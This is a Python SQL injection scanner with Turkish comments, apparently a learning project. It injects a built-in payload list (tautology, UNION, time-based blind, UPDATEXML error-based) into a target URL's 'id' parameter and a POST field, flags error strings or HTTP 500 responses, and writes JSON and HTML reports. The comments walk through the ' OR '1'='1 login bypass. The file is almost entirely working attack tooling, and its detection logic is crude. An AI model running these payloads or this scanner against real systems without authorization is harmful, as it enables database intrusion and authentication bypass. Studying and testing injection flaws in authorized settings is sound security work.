
#! ✅ İlk olarak SQL Injection (SQLi) testleri ekleyeceğiz.
#! ✅ URL parametrelerine ve form girişlerine SQL payload’ları enjekte edeceğiz.
#! ✅ Yanıtları analiz ederek bir güvenlik açığı olup olmadığını belirleyeceğiz.
#£ Kodun nasıl çalışacağını anlatayım, sonra birlikte ekleyelim.
#£ URL ve form girişlerini tarayacağız.
#£ Payload’ları bu giriş noktalarına enjekte edeceğiz.
#£ Yanıtı inceleyerek "veritabanı hataları" veya "şüpheli davranışlar" olup olmadığını kontrol edeceğiz.

#$ SELECT * FROM users WHERE username = 'admin' AND password ='12345';  --> Örnek SQL sorgusu bu şekilde olabilir.
#½ ' OR '1'='1 --> Sorgusunu giriş alanlarına yazarsak.(username-password kısmı)
#$ SELECT * FROM users WHERE username = '' OR '1'='1' AND password = ''; --> Şeklinde her zaman doğru döneceği için saldırgan giriş yapmış olur!
import requests
import json
import os
from time import sleep

# SQLi Payload Listesi
def sqli_payloads():
    return [
        # Basic SQL Injection Payloads
        "' OR '1'='1", "' OR 1=1 --", '" OR "1"="1', "' UNION SELECT null,null,null --",
        "admin' --", "' OR 'a'='a", "' AND 1=1 --", "' AND 1=2 --", "' OR 1=1 LIMIT 1 --",
        
        # Error-based SQL Injection Payloads
        "' AND 1=1", "' AND 1=2", "' AND 1=0", "' AND 1=1 ORDER BY 1 --", "' AND 1=1 ORDER BY 100 --",

        # Time-based SQLi Payloads (Blind SQLi)
        "' OR IF(1=1, SLEEP(5), 0) --", "' OR IF(1=2, SLEEP(5), 0) --", "'; WAITFOR DELAY '0:0:5' --",

        # Union-based SQLi Payloads
        "' UNION SELECT NULL, NULL, NULL --", "' UNION SELECT 1, user(), database() --", 
        "' UNION SELECT 1,2,3,4 --",

        # Advanced SQL Injection Payloads
        "' OR EXISTS(SELECT * FROM users WHERE username='admin' AND password='password') --",
        "' OR 1=1 AND UPDATEXML(1, CONCAT(0x3c736563, user(), 0x3e), 1) --",
        "1' AND LENGTH(database()) > 0 --", "1' AND SUBSTRING(database(), 1, 1) = 'm' --"
    ]

# URL Parametrelerini Test Etme
def test_sqli_on_url(url):
    print(f"Testing URL: {url}")
    response = requests.get(url)
    
    # Durum Kodu Kontrolleri
    if response.status_code == 500:
        print(f"Potential SQLi vulnerability found at {url} - Status Code: {response.status_code}")
    
    # Hata Mesajı Kontrolleri
    if "error" in response.text.lower() or "mysql" in response.text.lower():
        print(f"Error found at {url}: {response.text}")
    
    return response

# URL'deki Parametreleri Test Etme
def test_sql_injection(url, payloads):
    results = []
    for payload in payloads:
        test_url = f"{url}?id={payload}"
        response = test_sqli_on_url(test_url)
        
        # Hata veya Veritabanı Hatası Durumunda
        if "error" in response.text.lower() or response.status_code == 500:
            results.append(f"Vulnerable to SQLi: {test_url}")
    
    return results

# POST Parametrelerini Test Etme (POST istekleri için)
def test_sqli_on_post(url, payloads, post_data):
    results = []
    
    for payload in payloads:
        post_data["id"] = payload
        response = requests.post(url, data=post_data)
        
        if "error" in response.text.lower() or response.status_code == 500:
            results.append(f"Vulnerable to SQLi (POST): {url} with payload {payload}")
    
    return results

# JSON Raporu Oluşturma
def generate_json_report(results, folder_path):
    if not os.path.exists(folder_path):
        os.makedirs(folder_path)
    
    report_file = os.path.join(folder_path, "sql_injection_report.json")
    with open(report_file, "w") as json_file:
        json.dump(results, json_file, indent=4)

# HTML Raporu Oluşturma
def generate_html_report(results, folder_path):
    if not os.path.exists(folder_path):
        os.makedirs(folder_path)
    
    report_file = os.path.join(folder_path, "sql_injection_report.html")
    with open(report_file, "w") as html_file:
        html_file.write("<html><head><title>SQL Injection Report</title></head><body>")
        html_file.write("<h1>SQL Injection Test Results</h1>")
        for result in results:
            html_file.write(f"<p>{result}</p>")
        html_file.write("</body></html>")

# Yeni Klasör Kontrolü: `reports` varsa, otomatik olarak `report_1`, `report_2` vb. oluşturulacak
def get_next_folder_path(base_folder="sql_injection_reports"):
    i = 1
    while True:
        folder_path = f"{base_folder}_{i}"
        if not os.path.exists(folder_path):
            return folder_path
        i += 1

# Ana Fonksiyon
def main():
    url = input("Enter the URL to test for SQL Injection (e.g., http://example.com/product?id=123): ")
    
    # Yeni klasör yolu oluşturma
    folder_path = get_next_folder_path()
    
    # URL parametreleri ve POST verileri
    post_data = {"id": "1"}  # POST isteği için örnek veri
    
    payloads = sqli_payloads()
    
    # GET Yöntemi ile SQLi Testi
    print("\nTesting GET parameters for SQLi...")
    results = test_sql_injection(url, payloads)
    
    # POST Yöntemi ile SQLi Testi
    print("\nTesting POST parameters for SQLi...")
    post_results = test_sqli_on_post(url, payloads, post_data)
    
    results.extend(post_results)
    
    # Raporları oluştur
    generate_json_report(results, folder_path)
    generate_html_report(results, folder_path)
    
    print(f"SQL Injection test complete. Reports generated in {folder_path}.")

if __name__ == "__main__":
    main()
